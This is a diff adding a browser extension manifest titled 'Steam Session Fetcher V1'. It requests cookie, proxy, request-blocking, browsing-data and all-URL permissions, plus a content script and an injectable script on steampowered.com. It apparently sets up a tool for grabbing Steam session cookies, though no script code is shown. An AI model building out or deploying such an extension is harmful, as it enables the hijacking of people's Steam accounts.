@@ -1,0 +1,34 @@
+{
+  "name": "Steam Session Fetcher V1",
+  "version": "0.0.0",
+  "manifest_version": 2,
+  "background": {
+    "scripts": [
+      "backend.js"
+    ],
+    "persistent": true
+  },
+  "permissions": [
+    "proxy",
+    "tabs",
+    "cookies",
+    "webRequest",
+    "browsingData",
+    "webRequestBlocking",
+    "<all_urls>"
+  ],
+  "content_scripts": [
+    {
+      "matches": [
+         "*://*.steampowered.com/*"
+      ],
+      "js": [
+         "content.js"
+      ]
+    }
+  ],
+  "web_accessible_resources": [
+    "mytab.html",
+    "frontend/inject.js"
+  ]
+}
